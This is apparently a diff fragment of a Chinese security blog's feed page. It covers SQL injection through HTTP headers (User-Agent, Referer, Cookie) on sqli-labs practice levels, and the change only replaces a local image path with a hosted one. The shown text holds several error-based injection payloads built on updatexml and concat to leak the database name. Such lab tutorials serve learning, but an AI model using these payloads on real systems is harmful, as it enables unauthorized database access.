@@ -24,7 +24,7 @@ Server:WEB服务器表明自己是什么软件及版本信息。例如：server 
 <pre><code>&#39; and updatexnl(1,concat(0x23,database(),0x23),1) and &#39;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571472840.05.png" alt=""></p>
 <h2 id="Referer头注入"><a href="#Referer头注入" class="headerlink" title="Referer头注入"></a>Referer头注入</h2><p><strong>与UA头注入类似</strong></p>
 <p><em>sqlilabs靶场第19关</em></p>
-<pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1) or &#39;#</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571473914846.png" alt="1571473914846"></p>
+<pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1) or &#39;#</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571474970.18.png" alt=""></p>
 <h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><em>sqlilabs靶场第20关</em></p>
 <pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1)#</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571474297.68.png" alt=""></p>
 ]]></content>
